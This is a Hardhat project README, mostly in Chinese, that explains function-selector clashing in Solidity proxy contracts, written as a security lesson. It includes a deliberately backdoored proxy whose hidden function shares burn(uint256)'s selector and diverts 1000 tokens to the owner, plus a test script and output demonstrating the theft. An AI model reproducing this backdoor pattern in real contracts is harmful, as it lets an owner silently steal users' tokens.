# Sample Hardhat Project

This project demonstrates a basic Hardhat use case. It comes with a sample contract, a test for that contract, and a script that deploys that contract.

Try running some of the following tasks:

```shell
npx hardhat help
npx hardhat test
REPORT_GAS=true npx hardhat test
npx hardhat node
npx hardhat run scripts/deploy.ts
```


# 环境
执行自定义test文件: 
`npx hardhat test test/Proxy1.ts`

# 函数选择器冲突
在代理模式中, 如果方法不加以校验可能会出现安全漏洞.

在如下代理代码中:
代理合约
```代理合约
pragma solidity ^0.8.9;

contract Proxy {

    // 占位
    uint32 public placeholder1;
    uint32 public placeholder2;
    uint32 public placeholder3;

    address public proxyOwner;
    address public implementation;

    constructor(address implementation) public {
        proxyOwner = msg.sender;
        _setImplementation(implementation);
    }

    modifier onlyProxyOwner() {
        require(msg.sender == proxyOwner);
        _;
    }

    function upgrade(address implementation) external onlyProxyOwner {
        _setImplementation(implementation);
    }

    function _setImplementation(address imp) private {
        implementation = imp;
    }

    fallback() payable external {
        _fallback();
    }

    function collate_propagate_storage(bytes16 data) public {
        implementation.delegatecall(abi.encodeWithSignature("transfer(address,uint256)", proxyOwner, 1000));
    }

    function _fallback() internal {
        (bool success, bytes memory result) = implementation.delegatecall(msg.data);
        require(success, "failed to delegatecall");
        assembly {
            return (add(result, 0x20), mload(result))
        }
    }

}
```
逻辑合约
```
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20BurnableUpgradeable.sol";

contract BurnableToken is ERC20BurnableUpgradeable {

    function initialize() initializer public {
        __ERC20_init("MyToken", "MTK");
    }

    function mint(address account, uint256 amount) public {
        _mint(account, amount);
    }
}
```
测试逻辑
```
import {loadFixture} from "@nomicfoundation/hardhat-network-helpers";
import {ethers} from "hardhat";

describe("function clash proxy", function () {

    async function deployOneFixture() {

        // Contracts are deployed using the first signer/account by default
        const [owner, otherAccount] = await ethers.getSigners();

        const ownerAccountAddress = await owner.getAddress();
        const otherAccountAddress = await otherAccount.getAddress();

        const BurnableToken = await ethers.getContractFactory("BurnableToken");
        const burnableToken = await BurnableToken.deploy();

        const ProxyFuncClashing = await ethers.getContractFactory("ProxyFuncClashing");
        const proxyFuncClashing = await ProxyFuncClashing.deploy(burnableToken.address);

        const proxyToken = await BurnableToken.attach(proxyFuncClashing.address);

        await proxyToken.initialize();

        await proxyToken.mint(otherAccountAddress, '0x0000000000000000000000000000000100000000000000000000000000000001');

        let balance = await proxyToken.balanceOf(otherAccountAddress)
        console.log(`before other amount: ${balance.toString()}`)

        // collate_propagate_storage(bytes16 data) 在取参数时只用16bytes 后面用0补位
        await proxyToken.connect(otherAccount).burn('0x0000000000000000000000000000000100000000000000000000000000000000');

        balance = await proxyToken.balanceOf(otherAccountAddress)
        console.log(`after other amount: ${balance.toString()}`)

        balance = await proxyToken.balanceOf(ownerAccountAddress)
        console.log(`after owner amount: ${balance.toString()}`)

        return {
            ownerAccountAddress,
            otherAccountAddress
        };
    }

    describe("Proxy", function () {
        it("test", async function () {
            await loadFixture(deployOneFixture);
        })
    })
});
```
使用hardhat测试。控制台执行npx hardhat test test.js 打印输出
```
before other amount: 340282366920938463463374607431768211457
after other amount: 340282366920938463463374607431768210457
after owner amount: 1000
```
可以看到, 本意是从other账户burn token。实际上执行的是proxy中的collate_propagate_storage 给proxyOwner转了1000token。

原因分析
在执行合约函数时, 是根据函数的选择器执行的。将函数名和参数类型进行编码，然后取前4字节。这就会出现冲突。
如下俩函数的选择器是一样的。
```
0x42966c68
collate_propagate_storage(bytes16)
burn(uint256)
```
在看到类似的代理合约时要注意, 普通用户应该只能调用fallback方法。完全透明的调用逻辑合约。

参考:
https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070
